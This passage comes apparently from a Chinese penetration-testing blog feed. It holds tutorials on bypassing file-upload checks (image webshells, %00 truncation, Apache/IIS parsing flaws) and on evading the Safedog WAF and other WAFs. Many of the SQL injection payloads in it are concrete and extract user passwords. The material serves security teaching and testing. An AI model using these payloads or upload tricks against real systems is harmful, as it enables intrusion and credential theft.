title="文件头检测绕过"></a>文件头检测绕过</h2><p>有的文件上传，上传时候会检测头文件，不同的文件，头文件也不尽相同。常见的文件上传图片头检测它检测图片是两个字节的长度，如果不是图片的格式，会禁止上传。</p><p>常见的文件头：</p><ul><li>JPEG(jpg)，文件头：FFD8FF </li><li>PNG(png)，文件头：89504E47 </li><li>GIF(gif)，文件头：47494638 </li><li>TIFF(tif)，文件头：49492A00 </li><li>WindowsBitmap(bmp)，文件头：424D</li></ul><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210921154007167.png" alt="image-20210921154007167"></p><p><img src="/2021/09/19/day28/image-20210921154704781.png" alt="image-20210921154704781"></p><p>如果上传的文件符合数字即可通过</p><p><strong>利用：</strong></p><ul><li>制作图片一句话，使用copy命令将php文件附加到jpg文件上，之后再上传</li><li>或者在提交时在前面加上GIF89a</li></ul><p><strong>第一种：</strong></p><pre class="line-numbers language-none"><code class="language-none">copy 1.gif/b+1.php test1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/09/19/day28/image-20210921155118113.png" alt="image-20210921155118113"></p><p>我们直接上传</p><p><img src="/2021/09/19/day28/image-20210921155745571.png" alt="image-20210921155745571"></p><p>直接上传后此方法限制了文件后缀为gif，我们需要使用其中给的文件包含漏洞，让一句话来执行</p><p><img src="/2021/09/19/day28/image-20210921155927341.png" alt="image-20210921155927341"></p><p>用它来访问我们的图片看看一句话执行了没有</p><p><img src="/2021/09/19/day28/image-20210921160017867.png" alt="image-20210921160017867"></p><p>可以看到执行成功了</p><p><strong>第二种：</strong></p><p>我们上传一个gif抓包看下</p><p><img src="/2021/09/19/day28/image-20210921160131850.png" alt="image-20210921160131850"></p><p>存在一个GIF8a，用来识别他的身份，让服务器知道它是一个gif，我们上传一个php，在前面加上GIF8a，猜测可以做到绕过</p><p><img src="/2021/09/19/day28/image-20210921160306587.png" alt="image-20210921160306587"></p><p>可以看到上传成功了</p><p>同样他的后缀也是GIF，不能直接作为php解析，我们用文件包含来检测</p><p><img src="/2021/09/19/day28/image-20210921160456050.png" alt="image-20210921160456050"></p><h2 id="图片检测函数绕过上传"><a href="#图片检测函数绕过上传" class="headerlink" title="图片检测函数绕过上传"></a>图片检测函数绕过上传</h2><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210921162617199.png" alt="image-20210921162617199"></p><p><strong>利用：</strong>这样的话我们可以直接上传图片马</p><p><img src="/2021/09/19/day28/image-20210921162742424.png" alt="image-20210921162742424"></p><p>同样上传后是gif，不能作为php解析，我们使用文件包含漏洞</p><p><img src="/2021/09/19/day28/image-20210921162852106.png" alt="image-20210921162852106"></p><h2 id="绕过图片二次渲染绕过"><a href="#绕过图片二次渲染绕过" class="headerlink" title="绕过图片二次渲染绕过"></a>绕过图片二次渲染绕过</h2><p>有些图片上传，会对上传的图片进行二次渲染后在保存，体积可能会更小，图片会模糊一些，但是符合网站的需求。</p><p>例如新闻图片封面等可能需要二次渲染，因为原图片占用的体积更大。访问的人数太多时候会占用，很大带宽。</p><p>二次渲染后的图片内容会减少，如果里面包含后门代码，可能会被省略。导致上传的图片马，恶意代码被清除。</p><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210921163820274.png" alt="image-20210921163820274"></p><p><img src="/2021/09/19/day28/image-20210921163943861.png" alt="image-20210921163943861"></p><p>png、gif大同小异</p><p><img src="/2021/09/19/day28/image-20210921164020241.png" alt="image-20210921164020241"></p><p>可以看到使用了imagecreatefromxxx来进行二次渲染</p><p><strong>利用：</strong></p><p>首先我们看是否允许上传gif，因为gif图片在二次渲染后与原图差别不大，我们最好使用gif马。</p><p>我们将gif原图上传，将二此渲染后的土图片下载下来找到相同处，用一句话覆盖相同处上传即可绕过</p><p><img src="/2021/09/19/day28/image-20210921164614386.png" alt="image-20210921164614386"></p><p><img src="/2021/09/19/day28/image-20210921165336570.png" alt="image-20210921165336570"></p><p>同样用文件包含查看一句话是否能执行</p><p><img src="/2021/09/19/day28/image-20210921165404940.png" alt="image-20210921165404940"></p><h2 id="文件上传条件竞争绕过"><a href="#文件上传条件竞争绕过" class="headerlink" title="文件上传条件竞争绕过"></a>文件上传条件竞争绕过</h2><p>在文件上传时，如果逻辑不对，会造成很大危害。</p><p>例如文件上传时，用move_uploaded_file 把上传的临时文件移动到指定目录，接着再用 rename 把文件设置为图片格式，如果在 rename 之前 进行move_uploaded_file 这个步骤，如果这个文件可被客户端访问，这样我们也可以获取一个 webshell。</p><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210921170459159.png" alt="image-20210921170459159"></p><p>在rename之前没有进行后缀限制，如果这时我们可以访问文件就会让我们得到一个webshell</p><h2 id="文件名可控绕过上传"><a href="#文件名可控绕过上传" class="headerlink" title="文件名可控绕过上传"></a>文件名可控绕过上传</h2><p>文件上传时,文件名的可被客户端修改控制,会导致漏洞产生。</p><p><strong>源码分析：</strong></p><p><img src="/2021/09/19/day28/image-20210921173529944.png" alt="image-20210921173529944"></p><p><strong>利用:</strong></p><ul><li><p>上传文件,文件码采用%00 截断,抓包解码例如 moon.php%00.php 截断后moon.php 或者使用/.</p></li><li><p>与中间的漏洞配合使用 </p><p>例如 iis6.0 上传 1.php;1.jpg </p><p>apache 上传 1.php.a 也能解析文件 a.asp;1.jpg 解析成 asp</p></li></ul><p><strong>第一种：</strong></p><p>上传php码 通过1.php%00.jpg绕过</p><p><img src="/2021/09/19/day28/image-20210921173955594.png" alt="image-20210921173955594"></p><p><img src="/2021/09/19/day28/image-20210921174053192.png" alt="image-20210921174053192"></p><p><strong>第二种：</strong></p><p>利用apache解析漏洞，apache默认从右往左进行解析</p><p><img src="/2021/09/19/day28/image-20210921174423890.png" alt="image-20210921174423890"></p><p><img src="/2021/09/19/day28/image-20210921174442922.png" alt="image-20210921174442922"></p><p>也可用1.php;1.jpg</p><p><img src="/2021/09/19/day28/image-20210921174529109.png" alt="image-20210921174529109"></p><p>改成iis6.0可解析文件</p><p>也可用/.</p><p><img src="/2021/09/19/day28/image-20210921174834788.png" alt="image-20210921174834788"></p><p><img src="/2021/09/19/day28/image-20210921174848397.png" alt="image-20210921174848397"></p><h2 id="数组绕过上传"><a href="#数组绕过上传" class="headerlink" title="数组绕过上传"></a>数组绕过上传</h2><p>此方法一般通过代码审计发现</p><p><strong>分析源码：</strong></p><p><img src="/2021/09/19/day28/image-20210921175851920.png" alt="image-20210921175851920"></p><p>所以我们需要让第二个数组大于1，这样他的值就获取不了，再用/这样就能上传了</p><p><strong>利用：</strong></p><p>首先我们过MIME检测，然后将变量设为数组，第二个数组大于1，用来过白名单</p><p><img src="/2021/09/19/day28/image-20210921184752082.png" alt="image-20210921184752082"></p><p><img src="/2021/09/19/day28/image-20210921185102144.png" alt="image-20210921185102144"></p><h2 id="文件上传其他漏洞"><a href="#文件上传其他漏洞" class="headerlink" title="文件上传其他漏洞"></a>文件上传其他漏洞</h2><p>nginx 0.83 /1.jpg%00php</p><p>apahce 1x 或者 2x</p><p>当 apache 遇见不认识的后缀名，会从后向前解析例如 1.php.rar 不认识 rar 就向前解析，直到知道它认识的后缀名。</p><p>phpcgi 漏洞(nginx iis7 或者以上) 上传图片后 1.jpg。访问 1.jpg/1.php 也会解析成php。</p><p>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</p><p>apache 通过 mod_php 来运行脚本，其 2.4.0-2.4.29 中存在 apache 换行解析漏洞，在解析 php 时 xxx.php\x0A 将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
          <category> 绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iis某狗绕过</title>
      <link href="/2021/09/17/day27/"/>
      <url>/2021/09/17/day27/</url>
      
        <content type="html"><![CDATA[<h1 id="iis某狗绕过注入"><a href="#iis某狗绕过注入" class="headerlink" title="iis某狗绕过注入"></a>iis某狗绕过注入</h1><p>对在安全狗4.0.30256版本(2021-09-17 16:19:25下最新版本)防护下的sql绕过，防护等级高级，中间件是iis8.5 php mysql。</p><span id="more"></span><p><img src="/2021/09/17/day27/image-20210918171933822.png" alt="image-20210918171933822"></p><p><img src="/2021/09/17/day27/image-20210918171955717.png" alt="image-20210918171955717"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="先进行简单的尝试"><a href="#先进行简单的尝试" class="headerlink" title="先进行简单的尝试"></a>先进行简单的尝试</h3><pre class="line-numbers language-none"><code class="language-none">?name=vince' union select 1,2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/09/17/day27/image-20210918172112622.png" alt="image-20210918172112622"></p><p><img src="/2021/09/17/day27/image-20210918172322256.png" alt="image-20210918172322256"></p><p>可以看到，sql语句请求被拦截了</p><p>我们删掉union发现拦截消失</p><p><img src="/2021/09/17/day27/image-20210918172358621.png" alt="image-20210918172358621"></p><p>猜测union select俩个关键字同时出现会被拦截</p><h3 id="and判断注入"><a href="#and判断注入" class="headerlink" title="and判断注入"></a>and判断注入</h3><p>我们使用and 1=1 and 1=2发现被拦截了</p><p><img src="/2021/09/17/day27/image-20210918174025440.png" alt="image-20210918174025440"></p><p>经过尝试发现十六进制不会被拦截，我们用此方法判断注入</p><pre class="line-numbers language-none"><code class="language-none">?name=vince'and unhex(30)!=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/09/17/day27/image-20210918173131426.png" alt="image-20210918173131426"></p><pre class="line-numbers language-none"><code class="language-none">?name=vince'and+0x3a!=1--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/09/17/day27/image-20210918174110688.png" alt="image-20210918174110688"></p><p>正确显示，判断出存在注入</p><p>判断版本</p><blockquote><p>之前在25提到 select \N代表null</p></blockquote><p>整型 数字型抓包修改提交方式 id.php改get.php</p><pre class="line-numbers language-none"><code class="language-none">?id=\Nor(substr(@@version+from+1+for+1)=5)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/09/17/day27/image-20210918181919627.png" alt="image-20210918181919627"></p><p>正确回显</p><h3 id="出数据"><a href="#出数据" class="headerlink" title="出数据"></a>出数据</h3><p>接下来就是看用什么方式出数据，我们这里主要用布尔注入和联合查询</p><h2 id="GET整型布尔注入绕过"><a href="#GET整型布尔注入绕过" class="headerlink" title="GET整型布尔注入绕过"></a>GET整型布尔注入绕过</h2><p>抓包尝试</p><p><img src="/2021/09/17/day27/image-20210918182935225.png" alt="image-20210918182935225"></p><p><img src="/2021/09/17/day27/image-20210918182955230.png" alt="image-20210918182955230"></p><p>经过尝试发现：users处做了拦截，我们使用反引号绕过</p><p><img src="/2021/09/17/day27/image-20210918183102851.png" alt="image-20210918183102851"></p><p>此时我们面临的问题是无法正确回显页面，这样的话我们判断正确与否</p><p>在25提到\N 绕过，我们使用此方法，使用此方法后我们就需要改关键字and，不然null and 任何值都为null，我们使用or</p><pre class="line-numbers language-none"><code class="language-none">?id=\Nor(substr((select+password+from+`users`+limit+1)+from+1+for+1)='e')--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/09/17/day27/image-20210918183330213.png" alt="image-20210918183330213"></p><p>成功回显</p><h2 id="GET字符型布尔注入绕过"><a href="#GET字符型布尔注入绕过" class="headerlink" title="GET字符型布尔注入绕过"></a>GET字符型布尔注入绕过</h2><p>抓包尝试</p><p><img src="/2021/09/17/day27/image-20210918183616925.png" alt="image-20210918183616925"></p><p><img src="/2021/09/17/day27/image-20210918183913058.png" alt="image-20210918183913058"></p><p>这里发现被拦截了，猜测跟and 1=1 and 1=2一样被拦截，我们用之前测试出的16进制字符绕过，思路是用if，让0x31跟if作比较，if中做判断，substr截取与猜解比较，正确返回0x31，错误返回0x30。当正确时，页面回显正确</p><p>到这里发现之前有所错误，16进制=还是会被拦截，然而16进制!=不会被拦截</p><p>让之前if中的0x31与3x30调换，截取与猜解对比，正确返回0x30，错误返回0x31</p><pre class="line-numbers language-none"><code class="language-none">?name=vince'and+0x31!=if((substr((select+password+from+`users`+limit+1)+from+1+for+1)='e'),0x30,0x31)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/09/17/day27/image-20210918184839568.png" alt="image-20210918184839568"></p><p>正确回显了</p><h2 id="GET字符型联合查询绕过"><a href="#GET字符型联合查询绕过" class="headerlink" title="GET字符型联合查询绕过"></a>GET字符型联合查询绕过</h2><p>抓包尝试</p><p><img src="/2021/09/17/day27/image-20210918185408551.png" alt="image-20210918185408551"></p><p>被拦截</p><p>之前尝试发现union select 同时出现被拦截</p><p>之前我们在26写过union select 绕过，我们进行尝试即可</p><p>有点多我们把这些例子做个字典跑一下</p><p><img src="/2021/09/17/day27/image-20210918190117240.png" alt="image-20210918190117240"></p><p><img src="/2021/09/17/day27/image-20210918190238485.png" alt="image-20210918190238485"></p><p>跑之前我们需要考虑线程问题，因为被安全狗防护，如果线程太快可能会被banip，所以我们把线程调低点</p><p><img src="/2021/09/17/day27/image-20210918190442451.png" alt="image-20210918190442451"></p><p><img src="/2021/09/17/day27/image-20210918190522727.png" alt="image-20210918190522727"></p><p>看来这些例子都不可以</p><p>我们继续进行尝试，终于发现了绕过方法</p><pre class="line-numbers language-none"><code class="language-none">?name=vince'union/*//--+//*/select+1,(select+password+from+`users`+limit+1)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/09/17/day27/image-20210918190846708.png" alt="image-20210918190846708"></p><p>成功回显处password</p><h2 id="POST整型联合查询绕过"><a href="#POST整型联合查询绕过" class="headerlink" title="POST整型联合查询绕过"></a>POST整型联合查询绕过</h2><p><img src="/2021/09/17/day27/image-20210918191059286.png" alt="image-20210918191059286"></p><p>抓包尝试</p><p><img src="/2021/09/17/day27/image-20210918191359009.png" alt="image-20210918191359009"></p><p>简单尝试就出来了</p>]]></content>
      
      
      <categories>
          
          <category> 绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> iis某狗绕过注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql绕过waf</title>
      <link href="/2021/08/14/60-zhi-day25/"/>
      <url>/2021/08/14/60-zhi-day25/</url>
      
        <content type="html"><![CDATA[<h1 id="sql注入绕过技术"><a href="#sql注入绕过技术" class="headerlink" title="sql注入绕过技术"></a>sql注入绕过技术</h1><p>详细介绍针对 waf 的拦截注入的绕过方法。</p><span id="more"></span><blockquote><p>SQL 注入绕过技术已经是一个老生常谈的内容了，防注入可以使用某些云 waf加速乐等安全产品，这些产品会自带 waf 属性拦截和抵御 SQL 注入，也有一些产品会在服务器里安装软件，例如 iis 安全狗、d 盾、还有就是在程序里对输入参数进行过滤和拦截 例如 360webscan 脚本等只要参数传入的时候就会进行检测，检测到有危害语句就会拦截。</p><p>SQL 注入绕过的技术也有许多。但是在日渐成熟的 waf 产品面前，因为 waf 产品的规则越来越完善，防御就会越来越严密，安全系统也跟着提高，对渗透测试而言，测试的难度就越来越高了。</p></blockquote><h2 id="空格字符绕过"><a href="#空格字符绕过" class="headerlink" title="空格字符绕过"></a>空格字符绕过</h2><p>两个空格代替一个空格，用 Tab 代替空格，%a0=空格</p><p>%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /<em>!</em>/</p><p>%09  TAB 键（水平）</p><p>%0a  新建一行</p><p>%0c  新的一页</p><p>%0d  return 功能</p><p>%0b  TAB 键（垂直）</p><p>%a0  空格</p><p>可以将空格字符替换成注释 /**/ </p><p>还可以使用 /*!这里的根据 mysql 版本的内容不注释*/</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=1 /\*!union\*//\*!select\*/1,2,3,4;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818144703390.png" alt="image-20210818144703390"></p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>将字符串设置为大小写，例如 and 1=1 转成 AND 1=1 AnD 1=1</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=1 UNION SELECT 1,2,3,4;select * from users where id=1 UniON SelECT 1,2,3,4;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818144949660.png" alt="image-20210818144949660"></p><p>见sqli-labs less27</p><h2 id="浮点数绕过注入"><a href="#浮点数绕过注入" class="headerlink" title="浮点数绕过注入"></a>浮点数绕过注入</h2><p>有的waf只检测整形、字符型，我们用数字型可以绕过</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=8 union select 1,2,3,4;select * from users where id=8.0 union select 1,2,3,4;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818145337643.png" alt="image-20210818145337643"></p><h2 id="NULL-值绕过"><a href="#NULL-值绕过" class="headerlink" title="NULL 值绕过"></a><strong>NULL</strong> 值绕过</h2><pre class="line-numbers language-none"><code class="language-none">select \N; 代表NULL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818145507394.png" alt="image-20210818145507394"></p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=\N union select 1,2,3,\N;select * from users where id=\N union select 1,2,3,\Nfrom users;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818145714322.png" alt="image-20210818145714322"></p><h2 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h2><p>如果 waf 拦截过滤单引号的时候，可以使用双引号 </p><p>在 mysql 里也可以用双引号作为字符串。</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id='1';select * from users where id="1";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818145840854.png" alt="image-20210818145840854"></p><p>也可以将字符串转换成十六进制 再进行查询</p><pre class="line-numbers language-none"><code class="language-none">select hex('admin'); 查看admin的十六进制select *from users where username='admin';select *from users where username=0x十六进制; 将那一串作为十六进制解析<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818150155582.png" alt="image-20210818150155582"></p><p>如果开启了gpc但是是整形注入，也可以使用hex十六进制绕过</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=-1 union select 1,2,(select group_concat(column_name) frominformation_schema.columns where table_name='users' limit 1),4;select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 limit 1),4;可以看到第二条我们没有用单引号，一样成功注入了<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818150919117.png" alt="image-20210818150919117"></p><h2 id="添加库名绕过"><a href="#添加库名绕过" class="headerlink" title="添加库名绕过"></a>添加库名绕过</h2><p>以下两条查询语句，执行的结果是一致的，但是有些 waf 的拦截规则 并不会拦截[库名].[表名]这种模式。</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=-1 union select 1,2,3,4 from users;select * from users where id=-1 union select 1,2,3,4 from moonsec.users;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818151329513.png" alt="image-20210818151329513"></p><p>mysql 中也可以添加库名查询表，例如跨库查询 mysql 库里的 usrs 表的内容:</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=-1 union select 1,2,3,concat(user,authentication_string) from mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818151931810.png" alt="image-20210818151931810"></p><h2 id="去重复绕过"><a href="#去重复绕过" class="headerlink" title="去重复绕过"></a>去重复绕过</h2><p>在 mysql 查询可以使用 distinct关键字 去除查询的重复值</p><p>可以利用这点突破 waf 拦截</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=-1 union distinct select 1,2,3,4 from users;select * from users where id=-1 union distinct select 1,2,3,version() from users;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818152128922.png" alt="image-20210818152128922"></p><h2 id="反引号绕过"><a href="#反引号绕过" class="headerlink" title="反引号绕过"></a>反引号绕过</h2><p>在 mysql 可以使用反引号`` 绕过一些 waf 拦截。字段可以加反引号或者不加，意义相同。</p><pre class="line-numbers language-none"><code class="language-none">insert into users (username,password,level) values('admin','123456','4');insert into users (`username`,`password`,`level`) values('admin1','123456','5');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818153437712.png" alt="image-20210818153437712"></p><h2 id="脚本语言特性绕过"><a href="#脚本语言特性绕过" class="headerlink" title="脚本语言特性绕过"></a>脚本语言特性绕过</h2><p>在 php 语言中 id=1&amp;id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一些 waf 的拦截。</p><p>id=1%00&amp;id=2 union select 1,2,3</p><p>有些 waf 会去匹配第一个 id 参数 1%00</p><p> %00 是截断字符，waf 会自动截断 从而不会检测后面的内容。到了程序中 id 就是等于 id=2 union select 1,2,3 从绕过注入拦截。</p><p>其他语言特性：</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818153657324.png" alt="image-20210818153657324"></p><h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><p>目前有些防注入脚本都会逗号进行拦截，例如常规注入中必须包含逗号</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=1 union select 1,2,3,4;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818153754558.png" alt="image-20210818153754558"></p><p>一般会对逗号过滤成空 select * from users where id=1 union select 1 2 3 4;</p><p>这样SQL 语句就会出错。所以可以不使用逗号进行 SQL 注入。</p><h3 id="substr-截取字符串"><a href="#substr-截取字符串" class="headerlink" title="substr 截取字符串"></a><strong>substr</strong> 截取字符串</h3><p>使用from for 避免使用逗号</p><pre class="line-numbers language-none"><code class="language-none">select(substr(database() from 1 for 1)); 查询当前库第一个字符select * from users where id=1 and 'p'=(select(substr(database() from 1 for 1)));    可以进一步优化 m 换成 hex 0x70 这样也避免了单引号select * from users where id=1 and 0x70=(select(substr(database() from 1 for 1)));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818172850439.png" alt="image-20210818172850439"></p><h3 id="mid截取字符串"><a href="#mid截取字符串" class="headerlink" title="mid截取字符串"></a>mid截取字符串</h3><p>这个 mid 函数跟 substr 函数功能相同，如果 substr 函数被拦截或者过滤可以使用这个函数代替。</p><pre class="line-numbers language-none"><code class="language-none">select mid(database() from 1 for 1); 这个方法如上。select * from users where id=1 and 'p'=(select(mid(database() from 1 for 1)));select * from users where id=1 and 0x70=(select(mid(database() from 1 for 1)));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="join绕过"><a href="#join绕过" class="headerlink" title="join绕过"></a>join绕过</h3><p>使用 join 自连接两个表</p><p>union select 1,2 #等价于 union select * from (select 1)a join (select 2)b<br>a 和 b 分别是表的别名</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=-1 union select 1,2,3,4;select * from users where id=-1 union select * from (select 1)a join (select 2)bjoin(select 3)c join(select 4)d;select * from users where id=-1 union select * from (select 1)a join (select 2)bjoin(select user())c join(select 4)d;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818173418267.png" alt="image-20210818173418267"></p><p>可以看到这里也没有使用逗号，从而绕过 waf 对逗号的拦截。</p><h3 id="like-绕过"><a href="#like-绕过" class="headerlink" title="like 绕过"></a><strong>like</strong> 绕过</h3><p>使用 like 模糊查询 select user() like ‘%r%’; 模糊查询成功返回 1 否则返回 0</p><pre class="line-numbers language-none"><code class="language-none">select user() like '%p%';select user() like '%r%';select * from users where id=1 and(select user() like '%r%');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818173747137.png" alt="image-20210818173747137"></p><p>找到第一个字符后继续进行下一个字符匹配。从而找到所有的字符串 最后就是要查询的内容。</p><p>这种 SQL 注入语句也不会存在逗号。从而绕过 waf 拦截</p><h3 id="limit-offset-绕过"><a href="#limit-offset-绕过" class="headerlink" title="limit offset 绕过"></a><strong>limit offset</strong> 绕过</h3><p>SQL 注入时，如果需要限定条目可以使用 limit 0,1 限定返回条目的数目 limit 0,1返回第一条记录 </p><p>如果对逗号进行拦截时，可以使用 limit 1 默认返回第一条数据。也可以使用 limit 1 offset 0 从零开始返回第一条记录，这样就绕过 waf 拦截了。</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818174053423.png" alt="image-20210818174053423"></p><p>同样不用使用逗号</p><h2 id="or-and-xor-not-绕过"><a href="#or-and-xor-not-绕过" class="headerlink" title="or and xor not 绕过"></a><strong>or and xor not</strong> 绕过</h2><p>目前主流的 waf 都会对 id=1 and 1=2、id=1 or 1=2、id=0 or 1=2、id=0 xor 1=1 limit 1 、id=1 xor 1=2 这些常见的 SQL 注入检测语句进行拦截。</p><p>像 and 这些还有字符代替，字符如下</p><p>and 等于&amp;&amp;</p><p>or 等于 ||</p><p>not 等于 !</p><p>xor 等于|</p><p>所以可以转换成这样</p><p>id=1 and 1=1 等于 id=1 &amp;&amp; 1=1</p><p>id=1 and 1=2 等于 id=1 &amp;&amp; 1=2</p><p>id=1 or 1=1    等于 id=1 || 1=1</p><p>id=0 or 1=0    等于 id=0 || 1=0</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818174708762.png" alt="image-20210818174708762"></p><p><img src="/2021/08/14/60-zhi-day25/image-20210818174742058.png" alt="image-20210818174742058"></p><p>可以绕过一些 waf 拦截继续对注入点进行安全检测</p><p>也可以使用运算符号</p><p>id=1 &amp;&amp; 2=1+1</p><p>id=1 &amp;&amp; 2=1-1</p><p><img src="/2021/08/14/60-zhi-day25/image-20210818174904691.png" alt="image-20210818174904691"></p><h2 id="ascii字符对比绕过"><a href="#ascii字符对比绕过" class="headerlink" title="ascii字符对比绕过"></a><strong>ascii</strong>字符对比绕过</h2><p>许多 waf 会对 union select 进行拦截 而且通常比较变态，那么可以不使用联合查询注入，可以使用字符截取对比法，进行突破。</p><pre class="line-numbers language-none"><code class="language-none">select substring(user(),1,1);select * from users where id=1 and substring(user(),1,1)='r';我们把'r'换成ascii码，这样开启gpc整形还可以进行注入select * from users where id=1 and ascii(substring(user(),1,1))=114;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818175703197.png" alt="image-20210818175703197"></p><p>可以看到构造得 SQL 攻击语句没有使用联合查询(union select)也可以把数据查询出来。</p><h2 id="等号绕过"><a href="#等号绕过" class="headerlink" title="等号绕过"></a>等号绕过</h2><p>如果程序会对=进行拦截 可以使用 like rlike regexp 或者使用&lt;或者&gt;</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=1 and ascii(substring(user(),1,1))&lt;115;select * from users where id=1 and ascii(substring(user(),1,1))&gt;115;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818180238938.png" alt="image-20210818180238938"></p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=1 and (select substring(user(),1,1)like 'r%');select * from users where id=1 and (select substring(user(),1,1)rlike 'r');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818180415847.png" alt="image-20210818180415847"></p><pre class="line-numbers language-none"><code class="language-none">select * from users where id=1 and 1=(select user() regexp '^r');select * from users where id=1 and 1=(select user() regexp '^a');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/14/60-zhi-day25/image-20210818180602250.png" alt="image-20210818180602250"></p><h2 id="双关键词绕过"><a href="#双关键词绕过" class="headerlink" title="双关键词绕过"></a>双关键词绕过</h2><p>有些程序会对单词 union、 select 进行转空，但是只会转一次这样会留下安全隐患。</p><p>双关键字绕过（若删除掉第一个匹配的 union 就能绕过）</p><pre class="line-numbers language-none"><code class="language-none">id=-1'UNIunionONSeLselectECT1,2,3--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到数据库里执行会变成 id=-1’UNION SeLECT1,2,3–+ 从而绕过注入拦截。</p><h2 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a>二次编码绕过</h2><p>有些程序会解析二次编码，造成 SQL 注入，因为 url 两次编码过后，waf 是不会拦截的。</p><pre class="line-numbers language-none"><code class="language-none">-1 union select 1,2,3,4#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第一次转码</p><pre class="line-numbers language-none"><code class="language-none">%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%34%23<span aria-hidden="true" 